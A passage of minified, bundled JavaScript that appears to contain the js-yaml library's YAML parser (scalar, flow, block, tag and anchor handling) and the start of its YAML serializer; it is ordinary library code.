      re.length !== 2 && k(B, "TAG directive accepts exactly two arguments"),
        (W = re[0]),
        (te = re[1]),
        y.test(W) ||
        k(B, "ill-formed tag handle (first argument) of the TAG directive"),
        f.call(B.tagMap, W) &&
        k(
          B,
          'there is a previously declared suffix for "' + W + '" tag handle'
        ),
        p.test(te) ||
        k(B, "ill-formed tag prefix (second argument) of the TAG directive");
      try {
        te = decodeURIComponent(te);
      } catch {
        k(B, "tag prefix is malformed: " + te);
      }
      B.tagMap[W] = te;
    },
  };
  function G(d, B, V, re) {
    var W, te, Z, oe;
    if (B < V) {
      if (((oe = d.input.slice(B, V)), re))
        for (W = 0, te = oe.length; W < te; W += 1)
          (Z = oe.charCodeAt(W)),
            Z === 9 ||
            (32 <= Z && Z <= 1114111) ||
            k(d, "expected valid JSON character");
      else u.test(oe) && k(d, "the stream contains non-printable characters");
      d.result += oe;
    }
  }
  function ne(d, B, V, re) {
    var W, te, Z, oe;
    for (
      a.isObject(V) ||
      k(
        d,
        "cannot merge mappings; the provided source object is unacceptable"
      ),
      W = Object.keys(V),
      Z = 0,
      oe = W.length;
      Z < oe;
      Z += 1
    )
      (te = W[Z]), f.call(B, te) || ((B[te] = V[te]), (re[te] = !0));
  }
  function se(d, B, V, re, W, te, Z, oe, ve) {
    var we, Pe;
    if (Array.isArray(W))
      for (
        W = Array.prototype.slice.call(W), we = 0, Pe = W.length;
        we < Pe;
        we += 1
      )
        Array.isArray(W[we]) &&
          k(d, "nested arrays are not supported inside keys"),
          typeof W == "object" &&
          A(W[we]) === "[object Object]" &&
          (W[we] = "[object Object]");
    if (
      (typeof W == "object" &&
        A(W) === "[object Object]" &&
        (W = "[object Object]"),
        (W = String(W)),
        B === null && (B = {}),
        re === "tag:yaml.org,2002:merge")
    )
      if (Array.isArray(te))
        for (we = 0, Pe = te.length; we < Pe; we += 1) ne(d, B, te[we], V);
      else ne(d, B, te, V);
    else
      !d.json &&
        !f.call(V, W) &&
        f.call(B, W) &&
        ((d.line = Z || d.line),
          (d.lineStart = oe || d.lineStart),
          (d.position = ve || d.position),
          k(d, "duplicated mapping key")),
        W === "__proto__"
          ? Object.defineProperty(B, W, {
            configurable: !0,
            enumerable: !0,
            writable: !0,
            value: te,
          })
          : (B[W] = te),
        delete V[W];
    return B;
  }
  function ce(d) {
    var B;
    (B = d.input.charCodeAt(d.position)),
      B === 10
        ? d.position++
        : B === 13
          ? (d.position++, d.input.charCodeAt(d.position) === 10 && d.position++)
          : k(d, "a line break is expected"),
      (d.line += 1),
      (d.lineStart = d.position),
      (d.firstTabInLine = -1);
  }
  function ie(d, B, V) {
    for (var re = 0, W = d.input.charCodeAt(d.position); W !== 0;) {
      for (; b(W);)
        W === 9 && d.firstTabInLine === -1 && (d.firstTabInLine = d.position),
          (W = d.input.charCodeAt(++d.position));
      if (B && W === 35)
        do W = d.input.charCodeAt(++d.position);
        while (W !== 10 && W !== 13 && W !== 0);
      if (S(W))
        for (
          ce(d), W = d.input.charCodeAt(d.position), re++, d.lineIndent = 0;
          W === 32;

        )
          d.lineIndent++, (W = d.input.charCodeAt(++d.position));
      else break;
    }
    return (
      V !== -1 && re !== 0 && d.lineIndent < V && M(d, "deficient indentation"),
      re
    );
  }
  function Re(d) {
    var B = d.position,
      V;
    return (
      (V = d.input.charCodeAt(B)),
      !!(
        (V === 45 || V === 46) &&
        V === d.input.charCodeAt(B + 1) &&
        V === d.input.charCodeAt(B + 2) &&
        ((B += 3), (V = d.input.charCodeAt(B)), V === 0 || R(V))
      )
    );
  }
  function J(d, B) {
    B === 1
      ? (d.result += " ")
      : B > 1 &&
      (d.result += a.repeat(
        `
`,
        B - 1
      ));
  }
  function Ee(d, B, V) {
    var re,
      W,
      te,
      Z,
      oe,
      ve,
      we,
      Pe,
      de = d.kind,
      Ue = d.result,
      P;
    if (
      ((P = d.input.charCodeAt(d.position)),
        R(P) ||
        C(P) ||
        P === 35 ||
        P === 38 ||
        P === 42 ||
        P === 33 ||
        P === 124 ||
        P === 62 ||
        P === 39 ||
        P === 34 ||
        P === 37 ||
        P === 64 ||
        P === 96 ||
        ((P === 63 || P === 45) &&
          ((W = d.input.charCodeAt(d.position + 1)), R(W) || (V && C(W)))))
    )
      return !1;
    for (
      d.kind = "scalar", d.result = "", te = Z = d.position, oe = !1;
      P !== 0;

    ) {
      if (P === 58) {
        if (((W = d.input.charCodeAt(d.position + 1)), R(W) || (V && C(W))))
          break;
      } else if (P === 35) {
        if (((re = d.input.charCodeAt(d.position - 1)), R(re))) break;
      } else {
        if ((d.position === d.lineStart && Re(d)) || (V && C(P))) break;
        if (S(P))
          if (
            ((ve = d.line),
              (we = d.lineStart),
              (Pe = d.lineIndent),
              ie(d, !1, -1),
              d.lineIndent >= B)
          ) {
            (oe = !0), (P = d.input.charCodeAt(d.position));
            continue;
          } else {
            (d.position = Z),
              (d.line = ve),
              (d.lineStart = we),
              (d.lineIndent = Pe);
            break;
          }
      }
      oe &&
        (G(d, te, Z, !1), J(d, d.line - ve), (te = Z = d.position), (oe = !1)),
        b(P) || (Z = d.position + 1),
        (P = d.input.charCodeAt(++d.position));
    }
    return (
      G(d, te, Z, !1), d.result ? !0 : ((d.kind = de), (d.result = Ue), !1)
    );
  }
  function I(d, B) {
    var V, re, W;
    if (((V = d.input.charCodeAt(d.position)), V !== 39)) return !1;
    for (
      d.kind = "scalar", d.result = "", d.position++, re = W = d.position;
      (V = d.input.charCodeAt(d.position)) !== 0;

    )
      if (V === 39)
        if (
          (G(d, re, d.position, !0),
            (V = d.input.charCodeAt(++d.position)),
            V === 39)
        )
          (re = d.position), d.position++, (W = d.position);
        else return !0;
      else
        S(V)
          ? (G(d, re, W, !0), J(d, ie(d, !1, B)), (re = W = d.position))
          : d.position === d.lineStart && Re(d)
            ? k(d, "unexpected end of the document within a single quoted scalar")
            : (d.position++, (W = d.position));
    k(d, "unexpected end of the stream within a single quoted scalar");
  }
  function T(d, B) {
    var V, re, W, te, Z, oe;
    if (((oe = d.input.charCodeAt(d.position)), oe !== 34)) return !1;
    for (
      d.kind = "scalar", d.result = "", d.position++, V = re = d.position;
      (oe = d.input.charCodeAt(d.position)) !== 0;

    ) {
      if (oe === 34) return G(d, V, d.position, !0), d.position++, !0;
      if (oe === 92) {
        if (
          (G(d, V, d.position, !0),
            (oe = d.input.charCodeAt(++d.position)),
            S(oe))
        )
          ie(d, !1, B);
        else if (oe < 256 && O[oe]) (d.result += N[oe]), d.position++;
        else if ((Z = w(oe)) > 0) {
          for (W = Z, te = 0; W > 0; W--)
            (oe = d.input.charCodeAt(++d.position)),
              (Z = v(oe)) >= 0
                ? (te = (te << 4) + Z)
                : k(d, "expected hexadecimal character");
          (d.result += D(te)), d.position++;
        } else k(d, "unknown escape sequence");
        V = re = d.position;
      } else
        S(oe)
          ? (G(d, V, re, !0), J(d, ie(d, !1, B)), (V = re = d.position))
          : d.position === d.lineStart && Re(d)
            ? k(d, "unexpected end of the document within a double quoted scalar")
            : (d.position++, (re = d.position));
    }
    k(d, "unexpected end of the stream within a double quoted scalar");
  }
  function j(d, B) {
    var V = !0,
      re,
      W,
      te,
      Z = d.tag,
      oe,
      ve = d.anchor,
      we,
      Pe,
      de,
      Ue,
      P,
      H = Object.create(null),
      X,
      z,
      Q,
      ee;
    if (((ee = d.input.charCodeAt(d.position)), ee === 91))
      (Pe = 93), (P = !1), (oe = []);
    else if (ee === 123) (Pe = 125), (P = !0), (oe = {});
    else return !1;
    for (
      d.anchor !== null && (d.anchorMap[d.anchor] = oe),
      ee = d.input.charCodeAt(++d.position);
      ee !== 0;

    ) {
      if ((ie(d, !0, B), (ee = d.input.charCodeAt(d.position)), ee === Pe))
        return (
          d.position++,
          (d.tag = Z),
          (d.anchor = ve),
          (d.kind = P ? "mapping" : "sequence"),
          (d.result = oe),
          !0
        );
      V
        ? ee === 44 && k(d, "expected the node content, but found ','")
        : k(d, "missed comma between flow collection entries"),
        (z = X = Q = null),
        (de = Ue = !1),
        ee === 63 &&
        ((we = d.input.charCodeAt(d.position + 1)),
          R(we) && ((de = Ue = !0), d.position++, ie(d, !0, B))),
        (re = d.line),
        (W = d.lineStart),
        (te = d.position),
        Le(d, B, t, !1, !0),
        (z = d.tag),
        (X = d.result),
        ie(d, !0, B),
        (ee = d.input.charCodeAt(d.position)),
        (Ue || d.line === re) &&
        ee === 58 &&
        ((de = !0),
          (ee = d.input.charCodeAt(++d.position)),
          ie(d, !0, B),
          Le(d, B, t, !1, !0),
          (Q = d.result)),
        P
          ? se(d, oe, H, z, X, Q, re, W, te)
          : de
            ? oe.push(se(d, null, H, z, X, Q, re, W, te))
            : oe.push(X),
        ie(d, !0, B),
        (ee = d.input.charCodeAt(d.position)),
        ee === 44
          ? ((V = !0), (ee = d.input.charCodeAt(++d.position)))
          : (V = !1);
    }
    k(d, "unexpected end of the stream within a flow collection");
  }
  function U(d, B) {
    var V,
      re,
      W = o,
      te = !1,
      Z = !1,
      oe = B,
      ve = 0,
      we = !1,
      Pe,
      de;
    if (((de = d.input.charCodeAt(d.position)), de === 124)) re = !1;
    else if (de === 62) re = !0;
    else return !1;
    for (d.kind = "scalar", d.result = ""; de !== 0;)
      if (((de = d.input.charCodeAt(++d.position)), de === 43 || de === 45))
        o === W
          ? (W = de === 43 ? s : n)
          : k(d, "repeat of a chomping mode identifier");
      else if ((Pe = _(de)) >= 0)
        Pe === 0
          ? k(
            d,
            "bad explicit indentation width of a block scalar; it cannot be less than one"
          )
          : Z
            ? k(d, "repeat of an indentation width identifier")
            : ((oe = B + Pe - 1), (Z = !0));
      else break;
    if (b(de)) {
      do de = d.input.charCodeAt(++d.position);
      while (b(de));
      if (de === 35)
        do de = d.input.charCodeAt(++d.position);
        while (!S(de) && de !== 0);
    }
    for (; de !== 0;) {
      for (
        ce(d), d.lineIndent = 0, de = d.input.charCodeAt(d.position);
        (!Z || d.lineIndent < oe) && de === 32;

      )
        d.lineIndent++, (de = d.input.charCodeAt(++d.position));
      if ((!Z && d.lineIndent > oe && (oe = d.lineIndent), S(de))) {
        ve++;
        continue;
      }
      if (d.lineIndent < oe) {
        W === s
          ? (d.result += a.repeat(
            `
`,
            te ? 1 + ve : ve
          ))
          : W === o &&
          te &&
          (d.result += `
`);
        break;
      }
      for (
        re
          ? b(de)
            ? ((we = !0),
              (d.result += a.repeat(
                `
`,
                te ? 1 + ve : ve
              )))
            : we
              ? ((we = !1),
                (d.result += a.repeat(
                  `
`,
                  ve + 1
                )))
              : ve === 0
                ? te && (d.result += " ")
                : (d.result += a.repeat(
                  `
`,
                  ve
                ))
          : (d.result += a.repeat(
            `
`,
            te ? 1 + ve : ve
          )),
        te = !0,
        Z = !0,
        ve = 0,
        V = d.position;
        !S(de) && de !== 0;

      )
        de = d.input.charCodeAt(++d.position);
      G(d, V, d.position, !1);
    }
    return !0;
  }
  function le(d, B) {
    var V,
      re = d.tag,
      W = d.anchor,
      te = [],
      Z,
      oe = !1,
      ve;
    if (d.firstTabInLine !== -1) return !1;
    for (
      d.anchor !== null && (d.anchorMap[d.anchor] = te),
      ve = d.input.charCodeAt(d.position);
      ve !== 0 &&
      (d.firstTabInLine !== -1 &&
        ((d.position = d.firstTabInLine),
          k(d, "tab characters must not be used in indentation")),
        !(ve !== 45 || ((Z = d.input.charCodeAt(d.position + 1)), !R(Z))));

    ) {
      if (((oe = !0), d.position++, ie(d, !0, -1) && d.lineIndent <= B)) {
        te.push(null), (ve = d.input.charCodeAt(d.position));
        continue;
      }
      if (
        ((V = d.line),
          Le(d, B, l, !1, !0),
          te.push(d.result),
          ie(d, !0, -1),
          (ve = d.input.charCodeAt(d.position)),
          (d.line === V || d.lineIndent > B) && ve !== 0)
      )
        k(d, "bad indentation of a sequence entry");
      else if (d.lineIndent < B) break;
    }
    return oe
      ? ((d.tag = re),
        (d.anchor = W),
        (d.kind = "sequence"),
        (d.result = te),
        !0)
      : !1;
  }
  function ge(d, B, V) {
    var re,
      W,
      te,
      Z,
      oe,
      ve,
      we = d.tag,
      Pe = d.anchor,
      de = {},
      Ue = Object.create(null),
      P = null,
      H = null,
      X = null,
      z = !1,
      Q = !1,
      ee;
    if (d.firstTabInLine !== -1) return !1;
    for (
      d.anchor !== null && (d.anchorMap[d.anchor] = de),
      ee = d.input.charCodeAt(d.position);
      ee !== 0;

    ) {
      if (
        (!z &&
          d.firstTabInLine !== -1 &&
          ((d.position = d.firstTabInLine),
            k(d, "tab characters must not be used in indentation")),
          (re = d.input.charCodeAt(d.position + 1)),
          (te = d.line),
          (ee === 63 || ee === 58) && R(re))
      )
        ee === 63
          ? (z && (se(d, de, Ue, P, H, null, Z, oe, ve), (P = H = X = null)),
            (Q = !0),
            (z = !0),
            (W = !0))
          : z
            ? ((z = !1), (W = !0))
            : k(
              d,
              "incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line"
            ),
          (d.position += 1),
          (ee = re);
      else {
        if (
          ((Z = d.line),
            (oe = d.lineStart),
            (ve = d.position),
            !Le(d, V, r, !1, !0))
        )
          break;
        if (d.line === te) {
          for (ee = d.input.charCodeAt(d.position); b(ee);)
            ee = d.input.charCodeAt(++d.position);
          if (ee === 58)
            (ee = d.input.charCodeAt(++d.position)),
              R(ee) ||
              k(
                d,
                "a whitespace character is expected after the key-value separator within a block mapping"
              ),
              z && (se(d, de, Ue, P, H, null, Z, oe, ve), (P = H = X = null)),
              (Q = !0),
              (z = !1),
              (W = !1),
              (P = d.tag),
              (H = d.result);
          else if (Q)
            k(d, "can not read an implicit mapping pair; a colon is missed");
          else return (d.tag = we), (d.anchor = Pe), !0;
        } else if (Q)
          k(
            d,
            "can not read a block mapping entry; a multiline key may not be an implicit key"
          );
        else return (d.tag = we), (d.anchor = Pe), !0;
      }
      if (
        ((d.line === te || d.lineIndent > B) &&
          (z && ((Z = d.line), (oe = d.lineStart), (ve = d.position)),
            Le(d, B, e, !0, W) && (z ? (H = d.result) : (X = d.result)),
            z || (se(d, de, Ue, P, H, X, Z, oe, ve), (P = H = X = null)),
            ie(d, !0, -1),
            (ee = d.input.charCodeAt(d.position))),
          (d.line === te || d.lineIndent > B) && ee !== 0)
      )
        k(d, "bad indentation of a mapping entry");
      else if (d.lineIndent < B) break;
    }
    return (
      z && se(d, de, Ue, P, H, null, Z, oe, ve),
      Q &&
      ((d.tag = we), (d.anchor = Pe), (d.kind = "mapping"), (d.result = de)),
      Q
    );
  }
  function me(d) {
    var B,
      V = !1,
      re = !1,
      W,
      te,
      Z;
    if (((Z = d.input.charCodeAt(d.position)), Z !== 33)) return !1;
    if (
      (d.tag !== null && k(d, "duplication of a tag property"),
        (Z = d.input.charCodeAt(++d.position)),
        Z === 60
          ? ((V = !0), (Z = d.input.charCodeAt(++d.position)))
          : Z === 33
            ? ((re = !0), (W = "!!"), (Z = d.input.charCodeAt(++d.position)))
            : (W = "!"),
        (B = d.position),
        V)
    ) {
      do Z = d.input.charCodeAt(++d.position);
      while (Z !== 0 && Z !== 62);
      d.position < d.length
        ? ((te = d.input.slice(B, d.position)),
          (Z = d.input.charCodeAt(++d.position)))
        : k(d, "unexpected end of the stream within a verbatim tag");
    } else {
      for (; Z !== 0 && !R(Z);)
        Z === 33 &&
          (re
            ? k(d, "tag suffix cannot contain exclamation marks")
            : ((W = d.input.slice(B - 1, d.position + 1)),
              y.test(W) ||
              k(d, "named tag handle cannot contain such characters"),
              (re = !0),
              (B = d.position + 1))),
          (Z = d.input.charCodeAt(++d.position));
      (te = d.input.slice(B, d.position)),
        E.test(te) &&
        k(d, "tag suffix cannot contain flow indicator characters");
    }
    te && !p.test(te) && k(d, "tag name cannot contain such characters: " + te);
    try {
      te = decodeURIComponent(te);
    } catch {
      k(d, "tag name is malformed: " + te);
    }
    return (
      V
        ? (d.tag = te)
        : f.call(d.tagMap, W)
          ? (d.tag = d.tagMap[W] + te)
          : W === "!"
            ? (d.tag = "!" + te)
            : W === "!!"
              ? (d.tag = "tag:yaml.org,2002:" + te)
              : k(d, 'undeclared tag handle "' + W + '"'),
      !0
    );
  }
  function Se(d) {
    var B, V;
    if (((V = d.input.charCodeAt(d.position)), V !== 38)) return !1;
    for (
      d.anchor !== null && k(d, "duplication of an anchor property"),
      V = d.input.charCodeAt(++d.position),
      B = d.position;
      V !== 0 && !R(V) && !C(V);

    )
      V = d.input.charCodeAt(++d.position);
    return (
      d.position === B &&
      k(d, "name of an anchor node must contain at least one character"),
      (d.anchor = d.input.slice(B, d.position)),
      !0
    );
  }
  function _e(d) {
    var B, V, re;
    if (((re = d.input.charCodeAt(d.position)), re !== 42)) return !1;
    for (
      re = d.input.charCodeAt(++d.position), B = d.position;
      re !== 0 && !R(re) && !C(re);

    )
      re = d.input.charCodeAt(++d.position);
    return (
      d.position === B &&
      k(d, "name of an alias node must contain at least one character"),
      (V = d.input.slice(B, d.position)),
      f.call(d.anchorMap, V) || k(d, 'unidentified alias "' + V + '"'),
      (d.result = d.anchorMap[V]),
      ie(d, !0, -1),
      !0
    );
  }
  function Le(d, B, V, re, W) {
    var te,
      Z,
      oe,
      ve = 1,
      we = !1,
      Pe = !1,
      de,
      Ue,
      P,
      H,
      X,
      z;
    if (
      (d.listener !== null && d.listener("open", d),
        (d.tag = null),
        (d.anchor = null),
        (d.kind = null),
        (d.result = null),
        (te = Z = oe = e === V || l === V),
        re &&
        ie(d, !0, -1) &&
        ((we = !0),
          d.lineIndent > B
            ? (ve = 1)
            : d.lineIndent === B
              ? (ve = 0)
              : d.lineIndent < B && (ve = -1)),
        ve === 1)
    )
      for (; me(d) || Se(d);)
        ie(d, !0, -1)
          ? ((we = !0),
            (oe = te),
            d.lineIndent > B
              ? (ve = 1)
              : d.lineIndent === B
                ? (ve = 0)
                : d.lineIndent < B && (ve = -1))
          : (oe = !1);
    if (
      (oe && (oe = we || W),
        (ve === 1 || e === V) &&
        (t === V || r === V ? (X = B) : (X = B + 1),
          (z = d.position - d.lineStart),
          ve === 1
            ? (oe && (le(d, z) || ge(d, z, X))) || j(d, X)
              ? (Pe = !0)
              : ((Z && U(d, X)) || I(d, X) || T(d, X)
                ? (Pe = !0)
                : _e(d)
                  ? ((Pe = !0),
                    (d.tag !== null || d.anchor !== null) &&
                    k(d, "alias node should not have any properties"))
                  : Ee(d, X, t === V) &&
                  ((Pe = !0), d.tag === null && (d.tag = "?")),
                d.anchor !== null && (d.anchorMap[d.anchor] = d.result))
            : ve === 0 && (Pe = oe && le(d, z))),
        d.tag === null)
    )
      d.anchor !== null && (d.anchorMap[d.anchor] = d.result);
    else if (d.tag === "?") {
      for (
        d.result !== null &&
        d.kind !== "scalar" &&
        k(
          d,
          'unacceptable node kind for !<?> tag; it should be "scalar", not "' +
          d.kind +
          '"'
        ),
        de = 0,
        Ue = d.implicitTypes.length;
        de < Ue;
        de += 1
      )
        if (((H = d.implicitTypes[de]), H.resolve(d.result))) {
          (d.result = H.construct(d.result)),
            (d.tag = H.tag),
            d.anchor !== null && (d.anchorMap[d.anchor] = d.result);
          break;
        }
    } else if (d.tag !== "!") {
      if (f.call(d.typeMap[d.kind || "fallback"], d.tag))
        H = d.typeMap[d.kind || "fallback"][d.tag];
      else
        for (
          H = null,
          P = d.typeMap.multi[d.kind || "fallback"],
          de = 0,
          Ue = P.length;
          de < Ue;
          de += 1
        )
          if (d.tag.slice(0, P[de].tag.length) === P[de].tag) {
            H = P[de];
            break;
          }
      H || k(d, "unknown tag !<" + d.tag + ">"),
        d.result !== null &&
        H.kind !== d.kind &&
        k(
          d,
          "unacceptable node kind for !<" +
          d.tag +
          '> tag; it should be "' +
          H.kind +
          '", not "' +
          d.kind +
          '"'
        ),
        H.resolve(d.result, d.tag)
          ? ((d.result = H.construct(d.result, d.tag)),
            d.anchor !== null && (d.anchorMap[d.anchor] = d.result))
          : k(d, "cannot resolve a node with !<" + d.tag + "> explicit tag");
    }
    return (
      d.listener !== null && d.listener("close", d),
      d.tag !== null || d.anchor !== null || Pe
    );
  }
  function Ie(d) {
    var B = d.position,
      V,
      re,
      W,
      te = !1,
      Z;
    for (
      d.version = null,
      d.checkLineBreaks = d.legacy,
      d.tagMap = Object.create(null),
      d.anchorMap = Object.create(null);
      (Z = d.input.charCodeAt(d.position)) !== 0 &&
      (ie(d, !0, -1),
        (Z = d.input.charCodeAt(d.position)),
        !(d.lineIndent > 0 || Z !== 37));

    ) {
      for (
        te = !0, Z = d.input.charCodeAt(++d.position), V = d.position;
        Z !== 0 && !R(Z);

      )
        Z = d.input.charCodeAt(++d.position);
      for (
        re = d.input.slice(V, d.position),
        W = [],
        re.length < 1 &&
        k(
          d,
          "directive name must not be less than one character in length"
        );
        Z !== 0;

      ) {
        for (; b(Z);) Z = d.input.charCodeAt(++d.position);
        if (Z === 35) {
          do Z = d.input.charCodeAt(++d.position);
          while (Z !== 0 && !S(Z));
          break;
        }
        if (S(Z)) break;
        for (V = d.position; Z !== 0 && !R(Z);)
          Z = d.input.charCodeAt(++d.position);
        W.push(d.input.slice(V, d.position));
      }
      Z !== 0 && ce(d),
        f.call(K, re)
          ? K[re](d, re, W)
          : M(d, 'unknown document directive "' + re + '"');
    }
    if (
      (ie(d, !0, -1),
        d.lineIndent === 0 &&
          d.input.charCodeAt(d.position) === 45 &&
          d.input.charCodeAt(d.position + 1) === 45 &&
          d.input.charCodeAt(d.position + 2) === 45
          ? ((d.position += 3), ie(d, !0, -1))
          : te && k(d, "directives end mark is expected"),
        Le(d, d.lineIndent - 1, e, !1, !0),
        ie(d, !0, -1),
        d.checkLineBreaks &&
        m.test(d.input.slice(B, d.position)) &&
        M(d, "non-ASCII line breaks are interpreted as content"),
        d.documents.push(d.result),
        d.position === d.lineStart && Re(d))
    ) {
      d.input.charCodeAt(d.position) === 46 &&
        ((d.position += 3), ie(d, !0, -1));
      return;
    }
    if (d.position < d.length - 1)
      k(d, "end of the stream or a document separator is expected");
    else return;
  }
  function je(d, B) {
    (d = String(d)),
      (B = B || {}),
      d.length !== 0 &&
      (d.charCodeAt(d.length - 1) !== 10 &&
        d.charCodeAt(d.length - 1) !== 13 &&
        (d += `
`),
        d.charCodeAt(0) === 65279 && (d = d.slice(1)));
    var V = new F(d, B),
      re = d.indexOf("\0");
    for (
      re !== -1 &&
      ((V.position = re), k(V, "null byte is not allowed in input")),
      V.input += "\0";
      V.input.charCodeAt(V.position) === 32;

    )
      (V.lineIndent += 1), (V.position += 1);
    for (; V.position < V.length - 1;) Ie(V);
    return V.documents;
  }
  function _t(d, B, V) {
    B !== null &&
      typeof B == "object" &&
      typeof V > "u" &&
      ((V = B), (B = null));
    var re = je(d, V);
    if (typeof B != "function") return re;
    for (var W = 0, te = re.length; W < te; W += 1) B(re[W]);
  }
  function ct(d, B) {
    var V = je(d, B);
    if (V.length !== 0) {
      if (V.length === 1) return V[0];
      throw new i("expected a single document in the stream, but found more");
    }
  }
  return (Br.loadAll = _t), (Br.load = ct), Br;
}
var ui = {},
  Ts;
function Bf() {
  if (Ts) return ui;
  Ts = 1;
  var a = Sr(),
    i = Tr(),
    c = Do(),
    h = Object.prototype.toString,
    f = Object.prototype.hasOwnProperty,
    t = 65279,
    r = 9,
    l = 10,
    e = 13,
    o = 32,
    n = 33,
    s = 34,
    u = 35,
    m = 37,
    E = 38,
    y = 39,
    p = 42,
    A = 44,
    S = 45,
    b = 58,
    R = 61,
    C = 62,
    v = 63,
    w = 64,
    _ = 91,
    g = 93,
    D = 96,
    O = 123,
    N = 124,
    L = 125,
    F = {};
  (F[0] = "\\0"),
    (F[7] = "\\a"),
    (F[8] = "\\b"),
    (F[9] = "\\t"),
    (F[10] = "\\n"),
    (F[11] = "\\v"),
    (F[12] = "\\f"),
    (F[13] = "\\r"),
    (F[27] = "\\e"),
    (F[34] = '\\"'),
    (F[92] = "\\\\"),
    (F[133] = "\\N"),
    (F[160] = "\\_"),
    (F[8232] = "\\L"),
    (F[8233] = "\\P");
  var $ = [
    "y",
    "Y",
    "yes",
    "Yes",
    "YES",
    "on",
    "On",
    "ON",
    "n",
    "N",
    "no",
    "No",
    "NO",
    "off",
    "Off",
    "OFF",
  ],
    k = /^[-+]?[0-9_]+(?::[0-9_]+)+(?:\.[0-9_]*)?$/;
  function M(P, H) {
    var X, z, Q, ee, fe, ae, pe;
    if (H === null) return {};
    for (X = {}, z = Object.keys(H), Q = 0, ee = z.length; Q < ee; Q += 1)
      (fe = z[Q]),
        (ae = String(H[fe])),
        fe.slice(0, 2) === "!!" && (fe = "tag:yaml.org,2002:" + fe.slice(2)),
        (pe = P.compiledTypeMap.fallback[fe]),
        pe && f.call(pe.styleAliases, ae) && (ae = pe.styleAliases[ae]),
        (X[fe] = ae);
    return X;
  }
  function K(P) {
    var H, X, z;
    if (((H = P.toString(16).toUpperCase()), P <= 255)) (X = "x"), (z = 2);
    else if (P <= 65535) (X = "u"), (z = 4);
    else if (P <= 4294967295) (X = "U"), (z = 8);
    else
      throw new i(
        "code point within a string may not be greater than 0xFFFFFFFF"
      );
    return "\\" + X + a.repeat("0", z - H.length) + H;
  }
  var G = 1,
    ne = 2;
  function se(P) {
    (this.schema = P.schema || c),
      (this.indent = Math.max(1, P.indent || 2)),
      (this.noArrayIndent = P.noArrayIndent || !1),
      (this.skipInvalid = P.skipInvalid || !1),
      (this.flowLevel = a.isNothing(P.flowLevel) ? -1 : P.flowLevel),
      (this.styleMap = M(this.schema, P.styles || null)),
      (this.sortKeys = P.sortKeys || !1),
      (this.lineWidth = P.lineWidth || 80),
      (this.noRefs = P.noRefs || !1),
      (this.noCompatMode = P.noCompatMode || !1),
      (this.condenseFlow = P.condenseFlow || !1),
      (this.quotingType = P.quotingType === '"' ? ne : G),
      (this.forceQuotes = P.forceQuotes || !1),
      (this.replacer = typeof P.replacer == "function" ? P.replacer : null),
      (this.implicitTypes = this.schema.compiledImplicit),
      (this.explicitTypes = this.schema.compiledExplicit),
      (this.tag = null),
      (this.result = ""),
      (this.duplicates = []),
      (this.usedDuplicates = null);
  }
  function ce(P, H) {
    for (
      var X = a.repeat(" ", H), z = 0, Q = -1, ee = "", fe, ae = P.length;
      z < ae;

    )
      (Q = P.indexOf(
        `
`,
        z
      )),
        Q === -1
          ? ((fe = P.slice(z)), (z = ae))
          : ((fe = P.slice(z, Q + 1)), (z = Q + 1)),
        fe.length &&
        fe !==
        `
` &&
        (ee += X),
        (ee += fe);
    return ee;
  }
  function ie(P, H) {
    return (
      `
` + a.repeat(" ", P.indent * H)
    );
  }
  function Re(P, H) {
    var X, z, Q;
    for (X = 0, z = P.implicitTypes.length; X < z; X += 1)
      if (((Q = P.implicitTypes[X]), Q.resolve(H))) return !0;
    return !1;
  }
  function J(P) {
    return P === o || P === r;
  }
  function Ee(P) {
    return (
      (32 <= P && P <= 126) ||
      (161 <= P && P <= 55295 && P !== 8232 && P !== 8233) ||
      (57344 <= P && P <= 65533 && P !== t) ||
      (65536 <= P && P <= 1114111)
    );
  }
  function I(P) {
    return Ee(P) && P !== t && P !== e && P !== l;
  }
  function T(P, H, X) {
    var z = I(P),
      Q = z && !J(P);
    return (
      ((X ? z : z && P !== A && P !== _ && P !== g && P !== O && P !== L) &&
        P !== u &&
        !(H === b && !Q)) ||
      (I(H) && !J(H) && P === u) ||
      (H === b && Q)
    );
  }
  function j(P) {
    return (
      Ee(P) &&
      P !== t &&
      !J(P) &&
      P !== S &&
      P !== v &&
      P !== b &&
      P !== A &&
      P !== _ &&
      P !== g &&
      P !== O &&
      P !== L &&
      P !== u &&
      P !== E &&
      P !== p &&
      P !== n &&
      P !== N &&
      P !== R &&
      P !== C &&
      P !== y &&
      P !== s &&
      P !== m &&
      P !== w &&
      P !== D
    );
  }
  function U(P) {
    return !J(P) && P !== b;
  }
  function le(P, H) {
    var X = P.charCodeAt(H),
      z;
    return X >= 55296 &&
      X <= 56319 &&
      H + 1 < P.length &&
      ((z = P.charCodeAt(H + 1)), z >= 56320 && z <= 57343)
      ? (X - 55296) * 1024 + z - 56320 + 65536
      : X;
  }
  function ge(P) {
    var H = /^\n* /;
    return H.test(P);
  }
  var me = 1,
    Se = 2,
    _e = 3,
    Le = 4,
    Ie = 5;
  function je(P, H, X, z, Q, ee, fe, ae) {
    var pe,
      Ae = 0,
      Oe = null,
      Ne = !1,
      Ce = !1,
      Ut = z !== -1,
      it = -1,
      At = j(le(P, 0)) && U(le(P, P.length - 1));
    if (H || fe)
      for (pe = 0; pe < P.length; Ae >= 65536 ? (pe += 2) : pe++) {
        if (((Ae = le(P, pe)), !Ee(Ae))) return Ie;
        (At = At && T(Ae, Oe, ae)), (Oe = Ae);
      }
    else {
      for (pe = 0; pe < P.length; Ae >= 65536 ? (pe += 2) : pe++) {
        if (((Ae = le(P, pe)), Ae === l))
          (Ne = !0),
            Ut &&
            ((Ce = Ce || (pe - it - 1 > z && P[it + 1] !== " ")), (it = pe));
        else if (!Ee(Ae)) return Ie;
        (At = At && T(Ae, Oe, ae)), (Oe = Ae);
      }
      Ce = Ce || (Ut && pe - it - 1 > z && P[it + 1] !== " ");
    }
    return !Ne && !Ce
      ? At && !fe && !Q(P)
        ? me
        : ee === ne
          ? Ie
          : Se
      : X > 9 && ge(P)
        ? Ie
        : fe
          ? ee === ne
            ? Ie
            : Se
          : Ce
            ? Le
            : _e;
  }
  function _t(P, H, X, z, Q) {
    P.dump = (function () {
      if (H.length === 0) return P.quotingType === ne ? '""' : "''";
      if (!P.noCompatMode && ($.indexOf(H) !== -1 || k.test(H)))
        return P.quotingType === ne ? '"' + H + '"' : "'" + H + "'";
      var ee = P.indent * Math.max(1, X),
        fe =
          P.lineWidth === -1
            ? -1
            : Math.max(Math.min(P.lineWidth, 40), P.lineWidth - ee),
        ae = z || (P.flowLevel > -1 && X >= P.flowLevel);
      function pe(Ae) {
